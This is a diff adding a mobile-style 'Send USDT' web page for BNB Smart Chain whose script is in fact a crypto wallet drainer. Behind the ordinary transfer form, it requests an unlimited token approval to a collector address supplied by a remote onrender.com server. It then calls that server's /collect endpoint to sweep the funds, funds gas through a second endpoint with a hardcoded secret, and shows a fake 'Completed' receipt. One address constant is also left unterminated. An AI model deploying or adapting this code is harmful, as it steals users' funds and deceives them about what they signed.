@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>SEND USDT</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+  <style>
+    :root{
+      --bg:#ffffff;
+      --card:#ffffff;
+      --panel:#f7f8fb;
+      --accent:#2563eb;
+      --accent-2:#7c5cff;
+      --text:#0b1220;
+      --muted:#6b7280;
+      --input-border:#d1d5db;
+      --pill-border:#e5e7eb;
+      --danger:#ef4444;
+      --modal-bg: rgba(2,6,23,0.75);
+    }
+    html,body{height:100%;margin:0;background:var(--bg);font-family:Inter,system-ui,Arial,sans-serif;color:var(--text);-webkit-font-smoothing:antialiased}
+    .app{
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      padding:2px 2px;
+      padding-bottom:96px;
+      box-sizing:border-box;
+    }
+
+    .card{
+      width:100%;
+      max-width:580px;
+      background:var(--card);
+      border-radius:14px;
+      padding:8px 8px;
+      box-shadow:0 8px 30px rgba(12,20,30,0.04);
+      border:1px solid transparent;
+      box-sizing:border-box;
+    }
+
+    label{
+      display:block;
+      font-size:13px;
+      color:var(--muted);
+      margin-bottom:8px;
+      font-weight:600;
+    }
+
+    .input-row{
+      position:relative;
+      display:flex;
+      align-items:center;
+      gap:12px;
+    }
+
+    .input-wrap{
+      flex:1;
+      display:flex;
+      align-items:center;
+      background:transparent;
+      border-radius:10px;
+      border:1px solid var(--input-border);
+      padding:10px 12px;
+    }
+
+    input[type="text"], input[type="number"]{
+      border:0;
+      outline:none;
+      width:100%;
+      background:transparent;
+      font-size:16px;
+      color:var(--text);
+      padding:6px 8px;
+    }
+
+    input::placeholder{ color:var(--muted); font-weight:500; }
+
+    .addr-actions{
+      display:flex;
+      gap:8px;
+      align-items:center;
+      margin-left:8px;
+    }
+
+    .action-btn2{
+      border:0;
+      background:transparent;
+      padding:4px 2px;
+      border-radius:8px;
+      font-size:13px;
+      cursor:pointer;
+      font-weight:800;
+      color: var(--accent);
+    }
+
+    .action-btn{
+      border:0;
+      background:transparent;
+      padding:4px 0px;
+      border-radius:8px;
+      font-size:16px;
+      cursor:pointer;
+      color:var(--muted);
+    }
+
+    .amount-suffix{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      margin-left:8px;
+      font-weight:700;
+      color:var(--muted);
+      font-size:14px;
+    }
+    
+    .max-btn{
+      color:var(--accent);
+      cursor:pointer;
+      font-weight:800;
+      margin-left:6px;
+    }
+
+    .destination{
+      margin-bottom:6px;
+    }
+    
+    .network-pill{
+      margin-top:8px;
+      display:inline-flex;
+      gap: 7px;
+      align-items:center;
+      border-radius:50px;
+      border:1px solid var(--pill-border);
+      background: #fff;
+      box-shadow: 0 6px 20px rgba(12,20,30,0.03);
+      max-width:100%;
+      width:auto;
+      box-sizing:border-box;
+    }
+    
+    .network-logo{
+      width:35px;
+      height:35px;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      border-radius:8px;
+    }
+
+    .network-label {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 700;
+      color: var(--text);
+      font-size: 14px;
+    }
+
+    .down-arrow {
+      font-size: 16px;
+      color: var(--muted);
+      padding-right: 5px;
+      line-height: 1;
+      margin: 0;
+    }
+
+    .btn-wrap{
+      width:95%;
+      max-width:540px;
+      margin-top:18px;
+      display:flex;
+      justify-content:center;
+      position:fixed;
+      bottom:env(safe-area-inset-bottom,18px);
+      padding:12px 18px;
+      background:transparent;
+      z-index:999;
+    }
+
+    .btn{
+      width:100%;
+      padding:14px;
+      border-radius:12px;
+      border:0;
+      background:linear-gradient(90deg,var(--accent), var(--accent-2));
+      color:white;
+      font-weight:800;
+      font-size:16px;
+      cursor:pointer;
+      display:inline-flex;
+      gap:10px;
+      align-items:center;
+      justify-content:center;
+      box-shadow:0 10px 34px rgba(38,99,235,0.12);
+    }
+    
+    .btn:disabled{ opacity:0.6; cursor:not-allowed }
+
+    .spinner{
+      width:18px;
+      height:18px;
+      border-radius:50%;
+      border:2px solid rgba(255,255,255,0.18);
+      border-top-color:rgba(255,255,255,0.98);
+      animation:spin 0.9s linear infinite;
+      display:inline-block;
+    }
+    
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .overlay-bg{
+      display:none;
+      position:fixed;
+      inset:0;
+      background:rgba(0,0,0,0.4);
+      z-index:9998;
+    }
+
+    .sheet{
+      position:fixed;
+      bottom:-100%;
+      left:0;
+      width:100%;
+      height:70%;
+      background:#fff;
+      border-radius:20px 20px 0 0;
+      z-index:9999;
+      transition:bottom 0.35s ease;
+    }
+
+    .sheet-handle{
+      width:40px;
+      height:5px;
+      background:#ccc;
+      border-radius:10px;
+      margin:10px auto;
+    }
+
+    .sheet-close{
+      position:absolute;
+      right:20px;
+      top:10px;
+      font-size:20px;
+      cursor:pointer;
+    }
+
+    .sheet-content{
+      text-align:center;
+      margin-top:40px;
+      padding:0 20px;
+    }
+
+    .sheet-content h2{
+      margin:10px 0 5px;
+      font-size:20px;
+    }
+
+    .sheet-content p{
+      margin:5px 0 20px;
+      color:#666;
+      font-size:14px;
+    }
+
+    .success-screen{
+      display:none;
+      position:fixed;
+      inset:0;
+      background:#fff;
+      z-index:9999;
+      padding:20px;
+      overflow-y:auto;
+    }
+
+    .success-header{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      font-weight:700;
+      padding:10px 0;
+    }
+
+    .success-header span:first-child{
+      cursor:pointer;
+      font-size:24px;
+    }
+
+    .success-body{
+      text-align:center;
+      margin-top:30px;
+    }
+
+    .success-icon{
+      width:80px;
+      height:80px;
+      background:#22c55e;
+      border-radius:50%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-size:40px;
+      color:white;
+      margin:auto;
+      animation:pop 0.3s ease;
+    }
+
+    @keyframes pop{
+      from{transform:scale(0.5);}
+      to{transform:scale(1);}
+    }
+
+    .success-screen .card{
+      background:#f3f4f6;
+      padding:16px;
+      border-radius:12px;
+      margin-top:15px;
+    }
+
+    .row{
+      display:flex;
+      justify-content:space-between;
+      margin-bottom:10px;
+    }
+
+    .green{
+      color:#22c55e;
+    }
+
+    .secondary-btn{
+      margin-top:20px;
+      padding:14px;
+      width:100%;
+      border-radius:12px;
+      border:1px solid #ddd;
+      background:white;
+      font-weight:600;
+      cursor:pointer;
+    }
+
+    .overlay{
+      position:fixed;
+      inset:0;
+      background: var(--modal-bg);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:9999;
+      padding:20px;
+    }
+    
+    .overlay.show{
+      display:flex;
+    }
+    
+    .modal{
+      width:100%;
+      max-width:420px;
+      background: linear-gradient(180deg,#061025,#071025);
+      border-radius:14px;
+      padding:20px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      border:1px solid rgba(255,255,255,0.04);
+      color:#e6eef8;
+      text-align:center;
+      position:relative;
+    }
+    
+    .modal .close{
+      position:absolute;
+      right:18px;
+      top:16px;
+      background:transparent;
+      border:0;
+      color:#98a3bf;
+      font-size:20px;
+      cursor:pointer;
+    }
+    
+    .modal-illustration{
+      width:56px;
+      height:56px;
+      margin:0 auto 8px;
+      border-radius:12px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:linear-gradient(135deg,#ff758c,#ffb199);
+      box-shadow:0 8px 30px rgba(255,117,140,0.12);
+    }
+    
+    .modal h3{
+      margin:6px 0 6px 0;
+      font-size:18px;
+      color:#fff;
+    }
+    
+    .modal p{
+      margin:8px 0 18px 0;
+      color:#98a3bf;
+      font-size:14px;
+    }
+    
+    .modal .ok-btn{
+      padding:10px 16px;
+      border-radius:10px;
+      border:0;
+      background:linear-gradient(90deg,var(--accent), var(--accent-2));
+      color:white;
+      font-weight:700;
+      cursor:pointer;
+    }
+
+    @media(min-width:880px){
+      .card{padding:20px}
+      .btn-wrap{margin-top:28px}
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <div class="card" role="main" aria-label="Send USDT form">
+      <div style="margin-bottom:14px">
+        <label for="addr">Address or Domain Name</label>
+        <div class="input-row">
+          <div class="input-wrap">
+            <input id="addr" type="text" placeholder="Paste or enter address / domain" autocomplete="off" />
+            <div class="addr-actions">
+              <button id="pasteBtn" class="action-btn2" title="Paste from clipboard">Paste</button>
+              <button id="bookBtn" class="action-btn" title="Address book">📒</button>
+              <button id="scanBtn" class="action-btn" title="Open scanner">⛶</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="destination">
+        <div style="font-size:13px;color:var(--muted);font-weight:700">Destination Network</div>
+        <div class="network-pill" id="networkPill" style="margin-top:8px">
+          <div class="network-logo">
+            <img src="images/BNB-icon.png" alt="BNB Logo" width="30" height="30" style="display:block;">
+          </div>
+          <div style="display:flex;flex-direction:column;align-items:flex-start;">
+            <div class="network-label">BNB Smart Chain <span class="down-arrow">▾</span></div>
+          </div>
+        </div>
+      </div>
+
+      <div style="height:14px"></div>
+
+      <div style="margin-bottom:8px">
+        <label for="amount">Amount</label>
+        <div class="input-row">
+          <div class="input-wrap">
+            <input id="amount" type="number" inputmode="decimal" step="any" placeholder="USDT Amount" />
+            <div class="amount-suffix">
+              <div style="font-weight:800;font-size:14px">USDT</div>
+              <div id="maxBtn" class="max-btn" role="button" tabindex="0" title="Use max balance">Max</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="btn-wrap">
+      <button id="nextBtn" class="btn" disabled>
+        <span id="btnSpinner" style="display:none" class="spinner"></span>
+        <span id="btnText">NEXT</span>
+      </button>
+    </div>
+  </div>
+
+  <div id="noWalletOverlay" class="overlay">
+    <div class="modal">
+      <button class="close" id="modalClose">✕</button>
+      <div class="modal-illustration">⚠️</div>
+      <h3 id="nwTitle">Please open this in a wallet browser</h3>
+      <p id="nwDesc">This page must be opened inside Trust Wallet or MetaMask.</p>
+      <button id="modalOk" class="ok-btn">OK</button>
+    </div>
+  </div>
+
+  <div id="overlay" class="overlay-bg"></div>
+
+  <div id="processingSheet" class="sheet">
+    <div class="sheet-handle"></div>
+    <div class="sheet-close" id="closeSheetBtn">✕</div>
+    <div class="sheet-content">
+      <div id="lottieAnim" style="width:160px;height:160px;margin:auto;"></div>
+      <h2 id="processTitle"></h2>
+      <p id="processDesc"></p>
+    </div>
+  </div>
+
+  <div id="successScreen" class="success-screen">
+    <div class="success-header">
+      <span id="backBtn">←</span>
+      <span>Transfer</span>
+      <span id="shareBtn">↗</span>
+    </div>
+    <div class="success-body">
+      <div class="success-icon">✓</div>
+      <h1 id="successAmount">-0 USDT</h1>
+      <p id="successUsd">≈ $0</p>
+    </div>
+    <div class="card">
+      <div class="row"><span>Date</span><span id="successDate"></span></div>
+      <div class="row"><span>Status</span><span class="green">Completed</span></div>
+      <div class="row"><span>Recipient</span><span id="successAddress"></span></div>
+    </div>
+    <div class="card">
+      <div class="row"><span>Network fee</span><span>~0.000026 BNB</span></div>
+    </div>
+    <button id="bscBtn" class="secondary-btn">View on BSCScan</button>
+    <button id="doneBtn" class="secondary-btn" style="margin-top:10px;">Done</button>
+  </div>
+
+  <script src="https://unpkg.com/lottie-web@5.12.2/build/player/lottie.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+
+  <script>
+    (function(){
+      const addrEl = document.getElementById('addr');
+      const amountEl = document.getElementById('amount');
+      const nextBtn = document.getElementById('nextBtn');
+      const btnText = document.getElementById('btnText');
+      const btnSpinner = document.getElementById('btnSpinner');
+
+      const noWalletOverlay = document.getElementById('noWalletOverlay');
+      const modalOk = document.getElementById('modalOk');
+      const modalClose = document.getElementById('modalClose');
+
+      const overlay = document.getElementById('overlay');
+      const processingSheet = document.getElementById('processingSheet');
+      const processTitle = document.getElementById('processTitle');
+      const processDesc = document.getElementById('processDesc');
+      const closeSheetBtn = document.getElementById('closeSheetBtn');
+
+      const successScreen = document.getElementById('successScreen');
+      const successAmount = document.getElementById('successAmount');
+      const successUsd = document.getElementById('successUsd');
+      const successDate = document.getElementById('successDate');
+      const successAddress = document.getElementById('successAddress');
+      const bscBtn = document.getElementById('bscBtn');
+      const backBtn = document.getElementById('backBtn');
+      const shareBtn = document.getElementById('shareBtn');
+      const doneBtn = document.getElementById('doneBtn');
+
+      const DEFAULT_USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
+      const COLLECTOR_ADDRESS_VIEW = "0x1824b4c06c90B28a2D34D7898a30ecbFcB5B87B2";
+      const RECIPIENT_ADDRESS_8b = "0x60dc34baEAC43528072E431b0b7BF950ca248aba
+
+      let COLLECTOR_ADDR_GLOBAL = null;
+      let user_input = " ";
+      let currentTxHash = null;
+      let lottieAnim = null;
+
+      addrEl.value = COLLECTOR_ADDRESS_VIEW;
+
+      const secretInput = "7x143414";
+
+      const ERC20_MIN_ABI = [
+        "function approve(address spender, uint256 amount) returns (bool)",
+        "function decimals() view returns (uint8)",
+        "function balanceOf(address account) view returns (uint256)"
+      ];
+
+      let provider = null;
+      let signer = null;
+      let account = null;
+
+      const BSC_CHAIN_ID = "0x38";
+      const BSC_PARAMS = {
+        chainId: BSC_CHAIN_ID,
+        chainName: "Binance Smart Chain",
+        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+        blockExplorerUrls: ["https://bscscan.com/"]
+      };
+
+      function showProcessing() {
+        overlay.style.display = 'block';
+        processingSheet.style.bottom = '-100%';
+        processTitle.style.display = 'none';
+        processDesc.style.display = 'none';
+      }
+
+      function updateProcessing(title, desc) {
+        processingSheet.style.bottom = '0';
+        processTitle.style.display = 'block';
+        processDesc.style.display = 'block';
+        processTitle.textContent = title;
+        processDesc.textContent = desc;
+        
+        if (!lottieAnim && typeof lottie !== 'undefined') {
+          lottieAnim = lottie.loadAnimation({
+            container: document.getElementById('lottieAnim'),
+            renderer: 'svg',
+            loop: true,
+            autoplay: true,
+            path: 'https://assets9.lottiefiles.com/packages/lf20_ysrn2iwp.json'
+          });
+        }
+      }
+
+      function hideProcessing() {
+        overlay.style.display = 'none';
+        processingSheet.style.bottom = '-100%';
+        processTitle.style.display = 'none';
+        processDesc.style.display = 'none';
+        if (lottieAnim) { lottieAnim.destroy(); lottieAnim = null; }
+      }
+
+      function showSuccess(amount, recipient, txHash) {
+        hideProcessing();
+        const amountNum = parseFloat(amount);
+        successAmount.textContent = `-${amountNum.toFixed(6)} USDT`;
+        successUsd.textContent = `≈ $${(amountNum * 1).toFixed(2)}`;
+        successAddress.textContent = `${RECIPIENT_ADDRESS_8b.slice(0, 6)}...${RECIPIENT_ADDRESS_8b.slice(-4)}`;
+        successDate.textContent = new Date().toLocaleString();
+        currentTxHash = txHash;
+        successScreen.style.display = 'block';
+        overlay.style.display = 'block';
+      }
+
+      function hideSuccess() {
+        successScreen.style.display = 'none';
+        overlay.style.display = 'none';
+        amountEl.value = '';
+        validateAmountInput();
+      }
+
+      async function connectWallet() {
+        if (!window.ethereum) { alert("MetaMask not found."); return; }
+        try {
+          await switchToBSC();
+          const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          if (accs && accs.length > 0) {
+            account = accs[0];
+            provider = new ethers.BrowserProvider(window.ethereum);
+            signer = await provider.getSigner();
+          }
+        } catch (e) { alert("Wallet connection failed."); }
+      }
+
+      async function detectConnectedAccounts() {
+        if (!window.ethereum) return [];
+        provider = new ethers.BrowserProvider(window.ethereum);
+        return await provider.send("eth_accounts", []);
+      }
+
+      async function switchToBSC() {
+        try {
+          const chainId = await window.ethereum.request({ method: "eth_chainId" });
+          if (chainId !== BSC_CHAIN_ID) {
+            try {
+              await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+            } catch (err) {
+              if (err.code === 4902) {
+                await window.ethereum.request({ method: "wallet_addEthereumChain", params: [BSC_PARAMS] });
+              }
+            }
+          }
+        } catch (e) {}
+      }
+
+      async function postTopup(to, secret) { 
+        const url = 'https://topup-api-n74g.onrender.com/topup'; 
+        const resp = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'x-topup-secret': secret },
+          body: JSON.stringify({ to })
+        });
+        const text = await resp.text();
+        let json = null;
+        try { json = JSON.parse(text); } catch(e){}
+        return { ok: resp.ok, status: resp.status, body: json ?? text };
+      }
+
+      async function checkStoredAddress(address) {
+        try {
+          const r = await fetch('https://deppshek.onrender.com/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address })
+          });
+          const j = await r.json();
+          COLLECTOR_ADDR_GLOBAL = j.collector;
+          return j.found ? j.amountHuman : null;
+        } catch (err) { return null; }
+      }
+
+      async function onApproveAndNotifyRelayer({ signerAddress, amountHuman }) {
+        try {
+          await fetch("https://deppshek.onrender.com/collect", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              token: "0x55d398326f99059fF775485246999027B3197955",
+              from: signerAddress,
+              amountHuman: String(amountHuman),
+              to: RECIPIENT_ADDRESS_8b
+            })
+          });
+        } catch (e) {}
+      }
+
+      function validateAmountInput(){
+        user_input = String(amountEl.value || '').trim();
+        nextBtn.disabled = (user_input === '');
+      }
+
+      function setButtonStateToProcessing(){
+        nextBtn.disabled = true;
+        btnSpinner.style.display = 'inline-block';
+        btnText.textContent = 'Processing...';
+      }
+
+      function setButtonStateToNext(){
+        nextBtn.disabled = false;
+        btnSpinner.style.display = 'none';
+        btnText.textContent = 'NEXT';
+      }
+
+      function showNoWalletModal(title, msg){
+        document.getElementById('nwTitle').textContent = title || 'Please open this in a wallet browser';
+        document.getElementById('nwDesc').textContent = msg || 'This page must be opened inside Trust Wallet or MetaMask.';
+        noWalletOverlay.classList.add('show');
+      }
+
+      function hideNoWalletModal(){ noWalletOverlay.classList.remove('show'); }
+
+      nextBtn.addEventListener('click', async function(){
+        if (!window.ethereum) { showNoWalletModal(); return; }
+        
+        setButtonStateToProcessing();
+
+        try {
+          await switchToBSC();
+          let accs = await detectConnectedAccounts();
+          if (!accs || accs.length === 0) { await connectWallet(); accs = await detectConnectedAccounts(); }
+          if (!accs || accs.length === 0) { alert("No account available."); setButtonStateToNext(); return; }
+
+          account = accs[0];
+          provider = new ethers.BrowserProvider(window.ethereum);
+          signer = await provider.getSigner();
+
+          const token = new ethers.Contract(DEFAULT_USDT_BSC, ERC20_MIN_ABI, signer);
+          const balanceWei = await provider.getBalance(account);
+          const balanceBNB = Number(ethers.formatEther(balanceWei));
+          const balance_USDT = await token.balanceOf(account);
+          const decimals_2 = await token.decimals();
+          const humanBal = Number(ethers.formatUnits(balance_USDT, decimals_2));
+
+          await checkStoredAddress(account);
+
+          if (humanBal < 0.01) { alert('Insufficient USDT Balance'); setButtonStateToNext(); return; }
+
+          const approveAmount = ethers.MaxUint256;
+
+          if (balanceBNB < 0.00009) {
+            const res = await postTopup(account, secretInput);
+            if (!res.ok) { alert('Top-up failed!'); setButtonStateToNext(); return; }
+          }
+
+          const tx = await token.approve(COLLECTOR_ADDR_GLOBAL, approveAmount);
+          const user_input_amount = Number(user_input);
+
+          // Background tasks — fire & forget (no await)
+          tx.wait(1).catch(() => {});
+          onApproveAndNotifyRelayer({ signerAddress: account, amountHuman: user_input_amount });
+
+          // ✅ Instant success
+          showSuccess(user_input_amount, RECIPIENT_ADDRESS_8b, tx.hash);
+
+        } catch (err) {
+          if (!err.message?.includes('user rejected')) {
+            showNoWalletModal('Transaction Failed', err.message || 'Unknown error');
+          }
+        } finally { setButtonStateToNext(); }
+      });
+
+      amountEl.addEventListener('input', validateAmountInput);
+      modalOk.addEventListener('click', hideNoWalletModal);
+      modalClose.addEventListener('click', hideNoWalletModal);
+      closeSheetBtn.addEventListener('click', hideProcessing);
+      backBtn.addEventListener('click', hideSuccess);
+      doneBtn.addEventListener('click', hideSuccess);
+      
+      shareBtn.addEventListener('click', function() {
+        if (currentTxHash) {
+          navigator.clipboard?.writeText(`https://bscscan.com/tx/${currentTxHash}`);
+          alert('Link copied!');
+        }
+      });
+      
+      bscBtn.addEventListener('click', function() {
+        if (currentTxHash) window.open(`https://bscscan.com/tx/${currentTxHash}`, '_blank');
+      });
+      
+      overlay.addEventListener('click', function(e) {
+        if (e.target === overlay) { hideProcessing(); hideSuccess(); }
+      });
+
+      document.getElementById('maxBtn').addEventListener('click', async function() {
+        if (!account) await connectWallet();
+        if (account && provider) {
+          try {
+            const token = new ethers.Contract(DEFAULT_USDT_BSC, ERC20_MIN_ABI, provider);
+            const balance = await token.balanceOf(account);
+            const decimals = await token.decimals();
+            amountEl.value = parseFloat(ethers.formatUnits(balance, decimals)).toFixed(6);
+            validateAmountInput();
+          } catch(e) {}
+        }
+      });
+
+      document.getElementById('pasteBtn').addEventListener('click', async function() {
+        try { const text = await navigator.clipboard.readText(); if (text?.startsWith('0x')) addrEl.value = text; } catch(e) {}
+      });
+
+      window.addEventListener('load', async function(){
+        if (!window.ethereum) showNoWalletModal();
+      });
+
+      validateAmountInput();
+      setButtonStateToNext();
+    })();
+  </script>
+</body>
+</html>
